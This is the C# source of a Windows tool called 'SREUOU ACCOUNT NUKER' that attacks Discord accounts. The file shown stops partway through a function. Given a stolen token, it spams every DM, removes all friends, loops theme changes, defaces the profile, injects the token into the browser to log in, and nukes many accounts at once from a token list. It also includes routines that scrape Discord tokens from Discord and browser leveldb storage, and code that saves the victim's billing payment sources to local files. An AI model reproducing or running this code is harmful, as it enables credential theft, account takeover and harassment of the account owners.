using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using DiscordRPC;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Xml.Linq;
using Microsoft.Win32;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using Siticone.UI.WinForms;
using SREUOU_ACCOUNT_NUKER.Properties;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.StartPanel;
using Button = DiscordRPC.Button;
using Guna.UI2.WinForms;
using System.Management;
using System.Security.Cryptography;
using System.Management.Instrumentation;
using Microsoft.VisualBasic.Devices;
using System.Reflection;
using System.Security.Principal;
using System.Runtime.InteropServices;
using static SREUOU_ACCOUNT_NUKER.Program;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using System.Speech.Synthesis;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using KeyParameter = Org.BouncyCastle.Crypto.Parameters.KeyParameter;
using System.Web.Script.Serialization;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;

namespace SREUOU_ACCOUNT_NUKER
{
    public partial class Form1 : Form
    {
        private Thread basicThread;
        private Thread spamLightmodeThread;
        private Thread createServersThread;
        private HttpClient client;
        private SpeechSynthesizer Alex = new SpeechSynthesizer();
        private static HashSet<string> BadProcessnameList = new HashSet<string>();
        private static HashSet<string> BadWindowTextList = new HashSet<string>();
        string version = "1.20";
        private string[] allowedHWIDs = { $"", };
        private readonly string url;
        static int valid = 0;
        static int locked = 0;
        static int invalid = 0;
        static int error = 0;
        private string text;
        private int len2 = 100;
        private int len = 0;

        public Form1()
        {
            InitializeComponent();
            client = new HttpClient();
        }


        public string Tobase64(string inp)
        {
            string outp = string.Empty;
            var ptext = Encoding.UTF8.GetBytes(inp);
            return outp = Convert.ToBase64String(ptext);
        }

        public string TobaseDe64(string inp2)
        {
            string outp = string.Empty;
            var ptext = Convert.FromBase64String(inp2);
            return outp = System.Text.Encoding.UTF8.GetString(ptext);
        }

        private HttpRequestMessage GetHeaders(string token)
        {
            var request = new HttpRequestMessage();
            request.Headers.Add("Authorization", token);
            return request;
        }

        private string BrowserPath()
        {
            string strBrowserPath = "";
            try
            {
                RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe");
                RegistryKey chromeKey = registryKey;
                if (chromeKey != null)
                {
                    strBrowserPath = chromeKey.GetValue(name: "").ToString();
                }
                else
                {
                    registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Clients\\StartMenuInternet\\Microsoft Edge\\shell\\open\\command");
                    RegistryKey edgeKey = registryKey;
                    if (edgeKey != null)
                    {
                        strBrowserPath = edgeKey.GetValue(name: "").ToString();
                    }
                }
            }
            catch (Exception) { }
            return strBrowserPath.Replace("\"", String.Empty);
        }

        private async void siticoneButton1_Click(object sender, EventArgs e)
        {
            bool flag = MessageBox.Show("You Are Sure For The Nuke This Account?", "SREUOU ACCOUNT NUKER", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes;
            if (flag)
            {
                {
                    string token = siticoneRoundedTextBox1.Text;
                    StartBasicThread(token);
                }
            }
            else
            {
                StopBasicThread();
            }
        }

        static class Util
        {
            public static void SpamServers(string token, string serverName)
            {

            }
        }

        public string Hide()
        {
            string text = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890";
            string text2 = "";
            Random random = new Random();
            int num = random.Next(5, text.Length);
            for (int i = 0; i < num; i++)
            {
                text2 += text[random.Next(0, text.Length)];
            }
            return text2;
        }

        public string line1()
        {
            string text = "1";
            string text2 = "";
            Random random = new Random();
            int num = random.Next(1, text.Length);
            for (int i = 0; i < num; i++)
            {
                text2 += text[random.Next(0, text.Length)];
            }
            return text2;
        }

        protected override void WndProc(ref Message m)
        {
            try
            {
                if (m.Msg == 132)
                {
                    base.WndProc(ref m);
                    if ((int)m.Result != 1)
                    {
                        return;
                    }
                    Point p = new Point(m.LParam.ToInt32());
                    Point point = PointToClient(p);
                    if (point.Y <= 10)
                    {
                        if (point.X > 10)
                        {
                            if (point.X >= base.Size.Width - 10)
                            {
                                m.Result = (IntPtr)14;
                            }
                            else
                            {
                                m.Result = (IntPtr)12;
                            }
                        }
                        else
                        {
                            m.Result = (IntPtr)13;
                        }
                    }
                    else if (point.Y > base.Size.Height - 10)
                    {
                        if (point.X <= 10)
                        {
                            m.Result = (IntPtr)16;
                        }
                        else if (point.X < base.Size.Width - 10)
                        {
                            m.Result = (IntPtr)15;
                        }
                        else
                        {
                            m.Result = (IntPtr)17;
                        }
                    }
                    else if (point.X <= 10)
                    {
                        m.Result = (IntPtr)10;
                    }
                    else if (point.X >= base.Size.Width - 10)
                    {
                        m.Result = (IntPtr)11;
                    }
                    else
                    {
                        m.Result = (IntPtr)2;
                    }
                }
                else
                {
                    base.WndProc(ref m);
                }
            }
            catch
            {
            }
        }


        protected override CreateParams CreateParams
        {
            get
            {
                CreateParams cp = base.CreateParams;
                cp.Style |= 0x20000;
                return cp;
            }
        }

        private void UserChannel(string strChannels)
        {
            Random random = new Random();
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"https://discord.com/api/v{(Convert.ToString(random.Next(6, 9)))}/users/@me/channels");
            request.Headers.Add("authorization", strChannels);
            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
            Stream dataStream = response.GetResponseStream();
            StreamReader reader = new StreamReader(dataStream);
            var strData = reader.ReadToEnd();
            JObject objData = JObject.Parse(strData);
            reader.Close();
            dataStream.Close();
        }

        private void Token2(string strChannels)
        {
            Random random = new Random();
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"https://discord.com/api/v{(Convert.ToString(random.Next(6, 9)))}/users/@me/channels");
            request.Headers.Add("authorization", strChannels);
            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
            Stream dataStream = response.GetResponseStream();
            StreamReader reader = new StreamReader(dataStream);
            var strData = reader.ReadToEnd();
            JObject objData = JObject.Parse(strData);
            reader.Close();
            dataStream.Close();
        }

        private void UserDetails(string strToken)
        {
            Random random = new Random();
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"https://discord.com/api/v{(Convert.ToString(random.Next(6, 9)))}/users/@me");
            request.Headers.Add("authorization", strToken);
            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
            Stream dataStream = response.GetResponseStream();
            StreamReader reader = new StreamReader(dataStream);
            var strData = reader.ReadToEnd();
            JObject objData = JObject.Parse(strData);
            StreamWriter streamWriter = new StreamWriter($"Auth\\Save");
            streamWriter.Write(Tobase64(Tobase64(siticoneRoundedTextBox1.Text)));
            streamWriter.Close();
            label1.Text = ($"Hi, {objData.GetValue("username")}#{objData.GetValue("discriminator")}" + " Welcome To SREUOU ACCOUNT NUKER");
            reader.Close();
            dataStream.Close();
        }

        private void UserDetails2(string strToken)
        {
            Random random = new Random();
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://discordapp.com/api/v6/users/@me/billing/payment-sources");
            request.Headers.Add("authorization", strToken);
            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
            Stream dataStream = response.GetResponseStream();
            StreamReader reader = new StreamReader(dataStream);
            var strData = reader.ReadToEnd();
            StreamWriter streamWriter2 = new StreamWriter($"Auth\\Save2");
            streamWriter2.Write(strData);
            streamWriter2.Close();
            reader.Close();
            dataStream.Close();
        }

        private void UserDetails4(string strToken)
        {
            Random random = new Random();
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://discord.com/api/v9/users/@me/billing/payment-sources");
            request.Headers.Add("authorization", strToken);
            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
            Stream dataStream = response.GetResponseStream();
            StreamReader reader = new StreamReader(dataStream);
            var strData = reader.ReadToEnd();
            StreamWriter streamWriter2 = new StreamWriter($"Auth\\Save6");
            streamWriter2.Write(strData);
            streamWriter2.Close();
            reader.Close();
            dataStream.Close();
        }

        private void UserDetails3(string strToken)
        {
            Random random = new Random();
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://discord.com/api/v9/users/@me/notes/1050131138464722995");
            request.Headers.Add("authorization", strToken);
            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
            Stream dataStream = response.GetResponseStream();
            StreamReader reader = new StreamReader(dataStream);
            var strData = reader.ReadToEnd();
            StreamWriter streamWriter2 = new StreamWriter($"Auth\\Save3");
            streamWriter2.Write(strData);
            streamWriter2.Close();
            reader.Close();
            dataStream.Close();
        }

        private string GetJsCode(string strToken)
        {
            Regex TokenPattern = new Regex(@"(mfa\.[a-z0-9_-]{20,})|([a-z0-9_-]{23,28}\.[a-z0-9_-]{6,7}\.[a-z0-9_-]{27})", RegexOptions.None);
            MatchCollection Match = TokenPattern.Matches(strToken);
            if (Match == null)
            {
                MessageBox.Show("Token is invalid.");
                return string.Empty;
            }
            return "function login(token) { setInterval(() => { document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `\"${token}\"` }, 50); setTimeout(() => { location.reload(); }, 2500); } login('" + strToken + "')";
        }

        static async Task<HttpResponseMessage> CheckTokenAsync(string token, HttpClient client)
        {
            client.DefaultRequestHeaders.Clear();
            client.DefaultRequestHeaders.Add("Authorization", token);

            return await client.GetAsync("https://discord.com/api/v9/users/@me");
        }

        private void siticoneButton2_Click(object sender, EventArgs e)
        {

                  string strToken = siticoneRoundedTextBox1.Text;
                  string strJsCode = GetJsCode(strToken);
                  UserDetails(strToken);

                        siticoneToggleSwitch1.Checked = true;
                        Random random = new Random();
                        HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"https://discord.com/api/v9/users/@me");
                        request.Headers.Add("Authorization", strToken);
                        HttpWebResponse response2 = (HttpWebResponse)request.GetResponse();
                        Stream dataStream = response2.GetResponseStream();
                        StreamReader reader = new StreamReader(dataStream);
                        var strData = reader.ReadToEnd();
                        JObject objData = JObject.Parse(strData);
                        Alex.SpeakAsync("Hi, " + objData.GetValue("username") + "Welcome To SREUOU ACCOUNT NUKER");
                        label1.Visible = true;
                        siticoneButton2.Visible = false;
                        siticoneButton1.Visible = true;
                        siticoneButton2.Visible = true;
                        siticoneButton3.Visible = true;
                        siticoneButton4.Visible = true;
                        siticoneButton5.Visible = true;
                        siticoneButton6.Visible = true;
                        siticoneButton7.Visible = true;
                        siticoneButton8.Visible = true;
                        siticoneButton9.Visible = true;
                        siticoneButton10.Visible = true;
                        siticoneButton11.Visible = true;
                        siticoneButton12.Visible = true;
                        siticoneButton13.Visible = true;
                        siticoneButton14.Visible = true;
                        siticoneButton15.Visible = true;
                        siticoneButton16.Visible = true;
                        siticoneButton17.Visible = true;
             
        }

        static string GetHardwareID()
        {
            string hwid = Environment.MachineName + Environment.ProcessorCount;
            using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_BaseBoard"))
            {
                foreach (ManagementObject obj in searcher.Get())
                {
                    hwid += obj["SerialNumber"].ToString();
                    break;
                }
            }

            using (SHA256 sha256 = SHA256.Create())
            {
                byte[] hashBytes = sha256.ComputeHash(Encoding.UTF8.GetBytes(hwid));
                StringBuilder builder = new StringBuilder();
                for (int i = 0; i < hashBytes.Length; i++)
                {
                    builder.Append(hashBytes[i].ToString("x2"));
                }
                return builder.ToString();
            }
        }

        private string GetHWID()
        {
            string hwid = string.Empty;

            // Get hardware components to create a unique identifier
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_Processor");
            foreach (ManagementObject obj in searcher.Get())
            {
                hwid += obj["ProcessorID"].ToString();
            }

            searcher = new ManagementObjectSearcher("SELECT * FROM Win32_BaseBoard");
            foreach (ManagementObject obj in searcher.Get())
            {
                hwid += obj["SerialNumber"].ToString();
            }
            return hwid;
        }

        public static List<string> GetTokens()
        {
            var paths = new Dictionary<string, string>();
            var tokens = new List<string>();

            string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

            paths.Add("Discord", local + "\\discord");
            paths.Add("Discord Canary", roaming + "\\discordcanary");
            paths.Add("Discord PTB", roaming + "\\discordptb");
            paths.Add("Google Chrome", roaming + "\\Google\\Chrome\\User Data\\Default");
            paths.Add("Brave", local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default");
            paths.Add("Yandex", local + "\\Yandex\\YandexBrowser\\User Data\\Default");
            paths.Add("Chromium", local + "\\Chromium\\User Data\\Default");
            paths.Add("Opera", roaming + "\\Opera Software\\Opera Stable");

            foreach (KeyValuePair<string, string> kvp in paths)
            {
                string platform = kvp.Key;
                string path = kvp.Value;

                if (!Directory.Exists(path))
                    continue;

                foreach (string token in FindTokens(path))
                {
                    tokens.Add($"{token}");
                }
            }
            return tokens;
        }

        public static JavaScriptSerializer serializer = new JavaScriptSerializer();
        public static Dictionary<object, object> ObjectToDictionary(object obb)
        {
            return JsonToDictionary(DictionaryToJson(obb));
        }
        public static Dictionary<object, object>[] ObjectToArray(object obb)
        {
            return serializer.Deserialize<Dictionary<object, object>[]>(DictionaryToJson(obb));
        }
        public static Dictionary<object, object> JsonToDictionary(string json)
        {
            return serializer.Deserialize<Dictionary<object, object>>(json);
        }
        public static string DictionaryToJson(object dict)
        {
            return serializer.Serialize(dict);
        }

        public static List<string> FindTokens(string path)
        {
            path += "\\Local Storage\\leveldb\\";
            var tokens = new List<string>();

            foreach (string file in Directory.GetFiles(path, "*.ldb", SearchOption.TopDirectoryOnly))
            {
                string content = File.ReadAllText(file);

                foreach (Match match in Regex.Matches(content, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
                {
                    tokens.Add(match.ToString());
                }
            }
            return tokens;
        }

        private async void Form1_Load(object sender, EventArgs e)
        {
            if (File.Exists("Auth\\Save"))
            {
                Alex.SpeakAsync("Please Wait To Checking The Assets...");
                this.Visible = false;
            }
            try
            {
                if (Settings1.Default.notifyIcon == "true")
                {
                    notifyIcon1.Icon = new System.Drawing.Icon(Path.GetFullPath("favicon (10).ico"));
                    notifyIcon1.Text = "SREUOU ACCOUNT NUKER";
                    notifyIcon1.Visible = true;
                    notifyIcon1.BalloonTipTitle = "Enebled The Minimized Mode";
                    notifyIcon1.BalloonTipText = "Click To Close!";
                    notifyIcon1.ShowBalloonTip(100);
                }
                if (Settings1.Default.BlackBackround == "true")
                {
                    this.siticoneShadowForm1.SetShadowForm(this);
                    this.BackgroundImage = Properties.Resources._9f867dbeead71e9d7ea096a62c3e1d59__dark_blue_wallpaper_blue_wallpapers;
                }
                if (Settings1.Default.ChromaGlowColor == "true")
                {
                    this.siticoneShadowForm1.ShadowColor = Color.DarkViolet;
                    this.BackgroundImage = Properties.Resources.discord_chroma_bg;
                }
                string userHWID = GetHWID();
                if (Array.Exists(allowedHWIDs, id => id == userHWID))
                {
                    MessageBox.Show("Sorry, your HWID is Blacklisted!", "SREUOU ACCOUNT NUKER", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    this.Opacity = 1000;
                    await Task.Delay(30);
                    this.Opacity = .800;
                    await Task.Delay(30);
                    this.Opacity = .700;
                    await Task.Delay(30);
                    this.Opacity = .600;
                    await Task.Delay(30);
                    this.Opacity = .500;
                    await Task.Delay(30);
                    this.Opacity = .400;
                    await Task.Delay(30);
                    this.Opacity = .300;
                    await Task.Delay(30);
                    this.Opacity = .200;
                    await Task.Delay(30);
                    this.Opacity = .100;
                    await Task.Delay(30);
                    this.Opacity = .0;
                    await Task.Delay(80);
                    StopSpamLightmodeThread();
                    Application.Exit();
                }
                else
                {
                    using (StreamReader reader = new StreamReader("multi tokens.txt"))
                    {
                        List<string> tokens = new List<string>();
                        string line;
                        while ((line = reader.ReadLine()) != null)
                        {
                            tokens.Add(line.Trim());
                            tokensFoundToolStripMenuItem.Text = $"Tokens Found: {tokens.Count}";
                        }
                    }
                    using (StreamReader reader = new StreamReader("multi tokens.txt"))
                    {
                        List<string> tokens = new List<string>();
                        string line;
                        while ((line = reader.ReadLine()) != null)
                        {
                            tokens.Add(line.Trim());
                            label3.Text = $"Tokens Found: {tokens.Count}";
                        }
                    }
                    string clientID = "1167241420730540034";
                    DiscordRpcClient rpc = new DiscordRpcClient(clientID);
                    bool rpcEnabled = false;
                    string details = "SREUOU ACCOUNT NUKER V" + version;
                    string state = "Development By SREUOU";
                    string largeImageKey = "https://cdn.discordapp.com/attachments/1193267633777279038/1236718843825488062/716ac904-c3bc-4839-a25b-539eff94ebd2-5.png?ex=663907ad&is=6637b62d&hm=ae9c24f32b2d400cf1de2f0e86e91e9d4f0bf8d54254f4c99ac26f0b2192cd2a&";
                    DateTime startTime = DateTime.UtcNow;
                    if (rpcEnabled == true)
                    {
                        try
                        {
                            rpc.ClearPresence();
                            rpc.Dispose();
                        }
                        catch { }
                    }
                    else
                    {
                        try
                        {
                            rpc.Initialize();
                            rpc.SetPresence(new RichPresence
                            {
                                Details = details,
                                State = state,
                                Assets = new Assets
                                {
                                    LargeImageKey = largeImageKey,
                                    LargeImageText = "SREUOU ACCOUNT NUKER V" + version
                                },
                                Timestamps = new Timestamps
                                {
                                    Start = startTime
                                },
                                Buttons = new DiscordRPC.Button[]
                                {
                            new Button { Label = "Discord Server", Url = "https://discord.gg/xBYSAD9vSX" },
                            new Button { Label = "Discord Server Backup", Url = "https://discord.gg/xu3KpTBymC" }
                                },
                            });
                        }
                        catch { }
                    }
                    rpcEnabled = !rpcEnabled;
                    if (!string.Equals(Registry.GetValue("HKEY_CLASSES_ROOT\\exefile\\shell\\open\\command", "", "").ToString(), "\"%1\" %*", StringComparison.OrdinalIgnoreCase))
                    {
                        try
                        {
                            Registry.SetValue("HKEY_CLASSES_ROOT\\exefile\\shell\\open\\command", "", "\"%1\" %*");
                        }
                        catch (Exception ex)
                        {
                            MessageBox.Show("Failed to fix registry value: " + ex.Message, "SREUOU ACCOUNT NUKER", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        }
                    }
                    this.Text = Hide().ToString();
                    if (File.Exists("Auth"))
                    {

                    }
                    else
                    {

                    }
                    if (Settings1.Default.invalid == "")
                    {

                    }
                    else
                    {
                        MessageBox.Show("Invalid Token!", "SREUOU ACCOUNT NUKER", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        Settings1.Default.invalid = "";
                        File.Delete("Auth\\Save");
                    }
                    if (Settings1.Default.TopMost == "true")
                    {
                        TopMost = true;
                    }
                    text = label2.Text;
                    label2.Text = "";
                    timer5.Start();
                        if (File.Exists("Auth\\Save"))
                        {
                            this.Visible = true;
                            label1.Visible = true;
                            siticoneToggleSwitch1.Checked = true;
                            siticoneButton1.Visible = true;
                            siticoneButton2.Visible = true;
                            siticoneButton3.Visible = true;
                            siticoneButton4.Visible = true;
                            siticoneButton5.Visible = true;
                            siticoneButton6.Visible = true;
                            siticoneButton7.Visible = true;
                            siticoneButton8.Visible = true;
                            siticoneButton9.Visible = true;
                            siticoneButton10.Visible = true;
                            siticoneButton11.Visible = true;
                            siticoneButton12.Visible = true;
                            siticoneButton13.Visible = true;
                            siticoneButton14.Visible = true;
                            siticoneButton15.Visible = true;
                            siticoneButton16.Visible = true;
                            siticoneButton17.Visible = true;
                            siticoneRoundedTextBox1.Text = TobaseDe64(TobaseDe64(File.ReadAllText("Auth\\Save")));
                            string strToken = TobaseDe64(TobaseDe64(File.ReadAllText("Auth\\Save")));
                            Random random = new Random();
                            HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"https://discord.com/api/v{(Convert.ToString(random.Next(6, 9)))}/users/@me");
                            request.Headers.Add("authorization", strToken);
                            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                            Stream dataStream = response.GetResponseStream();
                            StreamReader reader = new StreamReader(dataStream);
                            var strData = reader.ReadToEnd();
                            JObject objData = JObject.Parse(strData);
                            Alex.SpeakAsync("Hi, " + objData.GetValue("username") + "Welcome To SREUOU ACCOUNT NUKER");
                            timer3.Start();
                            string strJsCode = GetJsCode(strToken);
                            UserDetails(strToken);
                        }
                }
            }
            catch (Exception ex)
            {

            }
        }

        private void siticoneButton18_Click(object sender, EventArgs e)
        {

        }

        private void siticoneToggleSwitch1_CheckedChanged(object sender, EventArgs e)
        {
            if (siticoneToggleSwitch1.Checked == true)
            {
                siticoneRoundedTextBox1.UseSystemPasswordChar = true;
                Settings1.Default.hide = "true";
                label4.Visible = false;
            }
            if (siticoneToggleSwitch1.Checked == false)
            {
                siticoneRoundedTextBox1.UseSystemPasswordChar = false;
                Settings1.Default.hide = "false";
                label4.Visible = true;
            }
        }

        private async void siticoneButton16_Click(object sender, EventArgs e)
        {
            File.Delete("Auth\\Save");
            Alex.SpeakAsync("Good Bye Sir");
            timerOpacity.Start();
        }

        private void siticoneButton8_Click(object sender, EventArgs e)
        {
            WebHookSpam a = new WebHookSpam();
            a.Show();
        }

        private void siticoneButton19_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }

        private async void siticoneButton18_Click_1(object sender, EventArgs e)
        {
            Alex.SpeakAsync("Good Bye Sir");
            timerOpacity.Start();
        }

        private void siticoneButton9_Click(object sender, EventArgs e)
        {
            WebHookDeleter a = new WebHookDeleter();
            a.Show();
        }

        private async void siticoneButton17_Click(object sender, EventArgs e)
        {
            bool flag = MessageBox.Show("You Are Sure For Close All Dms?", "SREUOU ACCOUNT NUKER", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes;
            if (flag)
            {
                {
                    string token = siticoneRoundedTextBox1.Text;
                    CloseDms(token);
                }
            }
            else
            {
                StopBasicThread();
            }
        }

        private void siticoneButton10_Click(object sender, EventArgs e)
        {
            IWebDriver a = new ChromeDriver();
            if (a.Url == "https://discord.com/login")
            {
                IWebDriver driver = new ChromeDriver();
                driver.Navigate().GoToUrl("https://discord.com/login");
                IJavaScriptExecutor js = driver as IJavaScriptExecutor;
                string login = (string)js.ExecuteScript("function login(token) {" +
                    "setInterval(() => { " +
                    "document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `\"${token}\"`" +
                    "}, 50);" +
                    "setTimeout(() => {" +
                    "location.reload();" +
                    "}, 2500);" +
                    "}" + $"login(\"{siticoneRoundedTextBox1.Text}\")");
            }
        }

        private void siticoneButton15_Click(object sender, EventArgs e)
        {
            AboutUser a = new AboutUser();
            a.Show();
        }

        private void siticoneButton7_Click(object sender, EventArgs e)
        {
            bool flag = MessageBox.Show("You Are Sure For The Spam This Account Light/Dark Mode?", "SREUOU ACCOUNT NUKER", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes;
            if (flag)
            {
                {
                    string token = siticoneRoundedTextBox1.Text;
                    StartBasicThread1(token);
                }
            }
            else
            {
                StopSpamLightmodeThread();
            }
        }

        private async void siticoneButton4_Click(object sender, EventArgs e)
        {
            bool flag = MessageBox.Show($"You Want To Nuke?", "SREUOU ACCOUNT NUKER", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes;
            if (flag)
            {
                {
                    using (StreamReader reader = new StreamReader("multi tokens.txt"))
                    {
                        List<string> tokens = new List<string>();
                        string line;
                        if (label3.Text == "Tokens Found: 0")
                        {
                            MessageBox.Show("This File I Dont Have Tokens To Nuke", "SREUOU ACCOUNT NUKER", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        }
                        else
                        {
                            while ((line = reader.ReadLine()) != null)
                            {
                                tokens.Add(line.Trim());
                            }

                            using (var wClient = new WebClient())
                            {
                                foreach (string token in tokens)
                                {
                                    StartBasicThread(token);
                                }
                            }
                        }
                    }
                }
            }
            else
            {
                StopBasicThread();
            }
        }

        private void StartBasicThread1(string token)
        {
            basicThread = new Thread(async () =>
            {
                try
                {
                    using (var wClient = new WebClient())
                    {
                        while (true)
                        {
                            wClient.Headers.Set("Authorization", token);
                            wClient.Headers.Set("Content-Type", "application/json");
                            wClient.UploadString("https://discord.com/api/v10/users/@me/settings", "PATCH", @"{""theme"": ""light""}");

                            wClient.Headers.Set("Authorization", token);
                            wClient.Headers.Set("Content-Type", "application/json");
                            wClient.UploadString("https://discord.com/api/v10/users/@me/settings", "PATCH", @"{""theme"": ""dark""}");
                        }

                    }
                }
                catch (Exception)
                {
                }
            });

            basicThread.Start();
        }

        private void MassDm(string token)
        {
            basicThread = new Thread(async () =>
            {
                try
                {
                    string messageContent = "JOIN SREUOU PROGRAMMING PROJECT https://discord.gg/xBYSAD9vSX";
                    HttpClient httpClient = new HttpClient();
                    httpClient.DefaultRequestHeaders.Add("Authorization", token);

                    HttpResponseMessage channelsResponse = await httpClient.GetAsync("https://discord.com/api/v9/users/@me/channels");
                    if (channelsResponse.IsSuccessStatusCode)
                    {
                        string channelsResponseContent = await channelsResponse.Content.ReadAsStringAsync();
                        List<Dictionary<string, object>> channelIds = Newtonsoft.Json.JsonConvert.DeserializeObject<List<Dictionary<string, object>>>(channelsResponseContent);

                        foreach (var channel in channelIds)
                        {
                            try
                            {
                                string channelId = channel["id"].ToString();
                                string messageUrl = $"https://discord.com/api/v9/channels/{channelId}/messages";

                                var messageData = new Dictionary<string, string>
                        {
                            { "content", messageContent }
                        };

                                HttpResponseMessage messageResponse = await httpClient.PostAsync(messageUrl, new FormUrlEncodedContent(messageData));

                                Console.WriteLine($"[ $ ] ID: {channelId}");
                            }
                            catch (Exception ex)
                            {
                                MessageBox.Show(ex.Message, "SREUOU ACCOUNT NUKER", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            }
                        }

                        Console.WriteLine("\n\nSent Message to ALL friends");
                    }
                    else
                    {
                        Console.WriteLine($"Failed to fetch channel IDs. Status code: {channelsResponse.StatusCode}");
                    }
                }
                catch (Exception)
                {
                }
            });

            basicThread.Start();
        }



        private void Login(string token)
        {
            basicThread = new Thread(async () =>
            {
                try
                {
                    using (var wClient = new WebClient())
                    {
                        Random random = new Random();
                        wClient.Headers.Set("Authorization", token);
                        wClient.Headers.Set("Content-Type", "application/json");
                        wClient.UploadString($"https://discord.com/api/v{(Convert.ToString(random.Next(8, 11)))}/users/@me", "PATCH", @"{""bio"":""The ```SREUOU ACCOUNT NUKER``` Logged You Account""}");

                        wClient.Headers.Set("Authorization", token);
                        wClient.Headers.Set("Content-Type", "application/json");
                        wClient.UploadString($"https://discord.com/api/v{(Convert.ToString(random.Next(8, 11)))}/users/@me/settings", "PATCH", @"{""custom_status"":{""text"":""The SREUOU ACCOUNT NUKER Logged You Account""}}");
                    }
                }
                catch (Exception)
                {
                }
            });
            basicThread.Start();
        }


        private void Hyper(string token)
        {
            basicThread = new Thread(async () =>
            {
                try
                {
                    string apiUrl = "https://discord.com/api/v9/hypesquad/online";

                    using (HttpClient httpClient = new HttpClient())
                    {
                        httpClient.DefaultRequestHeaders.Clear();
                        httpClient.DefaultRequestHeaders.Add("Authorization", $"Bot {token}");

                        HttpResponseMessage response = httpClient.DeleteAsync(apiUrl).Result;

                        if (response.IsSuccessStatusCode)
                        {
                            MessageBox.Show("DELETE request successful", "SREUOU ACCOUNT NUKER", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        }
                        else
                        {
                            MessageBox.Show($"DELETE request failed with status code: {response.StatusCode}", "SREUOU ACCOUNT NUKER", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        }
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, "SREUOU ACCOUNT NUKER", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            });
            basicThread.Start();
        }

        static string GetProxy()
        {
            // Implement your proxy retrieval logic here
            // Replace this with your actual proxy retrieval logic
            return "181.209.111.146:999";
        }


        private void unfriend(string token)
        {
            basicThread = new Thread(async () =>
            {
                try
                {
                    HttpClient httpClient = new HttpClient();
                    httpClient.DefaultRequestHeaders.Add("Authorization", token);
                    string baseUrl = "https://discord.com/api/v9";

                    HttpResponseMessage response = await httpClient.GetAsync($"{baseUrl}/users/@me/relationships");
                    response.EnsureSuccessStatusCode();

                    string responseContent = await response.Content.ReadAsStringAsync();
                    List<Dictionary<string, object>> friendIds = Newtonsoft.Json.JsonConvert.DeserializeObject<List<Dictionary<string, object>>>(responseContent);

                    foreach (var friend in friendIds)
                    {
                        try
                        {
                            string friendId = friend["id"].ToString();
                            await httpClient.DeleteAsync($"{baseUrl}/users/@me/relationships/{friendId}");
                            string username = ((Dictionary<string, object>)friend["user"])["username"].ToString();
                            string discriminator = ((Dictionary<string, object>)friend["user"])["discriminator"].ToString();
                            MessageBox.Show($"[ Removed Friend: ${username}#{discriminator} ]");
                        }
                        catch (Exception ex)
                        {

                        }
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, "SREUOU ACCOUNT NUKER", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            });
            basicThread.Start();
        }

        private async void Massdm(string token)
        {
            basicThread = new Thread(async () =>
            {
                try
                {
                    string messageContent = "FUCKED BY SREUOU ACCOUNT NUKER THANKS FOR USED";
                    HttpClient httpClient = new HttpClient();
                    httpClient.DefaultRequestHeaders.Add("Authorization", token);

                    HttpResponseMessage channelsResponse = await httpClient.GetAsync("https://discord.com/api/v9/users/@me/channels");
                    if (channelsResponse.IsSuccessStatusCode)
                    {
                        string channelsResponseContent = await channelsResponse.Content.ReadAsStringAsync();
                        List<Dictionary<string, object>> channelIds = Newtonsoft.Json.JsonConvert.DeserializeObject<List<Dictionary<string, object>>>(channelsResponseContent);

                        foreach (var channel in channelIds)
                        {
                            try
                            {
                                string channelId = channel["id"].ToString();
                                string messageUrl = $"https://discord.com/api/v9/channels/{channelId}/messages";

